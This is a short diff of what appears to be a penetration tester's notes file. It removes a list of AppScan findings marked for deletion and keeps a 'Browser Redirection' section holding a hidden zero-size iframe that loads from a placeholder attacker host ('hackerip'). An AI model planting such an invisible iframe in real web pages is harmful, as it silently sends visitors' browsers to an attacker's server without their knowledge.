@@ -8,17 +8,6 @@ HEAD / HTTP/1.0
 (hit enter 2x)
 ------------------------------------------------------------------------------------------------------
 
-# AppScan - delete the following:
-
-Cacheable SSL Page Found
-Client Side (JavaScript) Cookie Reference
-Email Address Pattern Found
-Hidden Directory Detected
-Query Parameter in SSL Request
-Robots.txt
-SSL Certificate Domain Name Mismatch
-------------------------------------------------------------------------------------------------------
-
 # Browser Redirection
 
 <iframe SRC="http://hackerip/report" height = "0" width ="0">
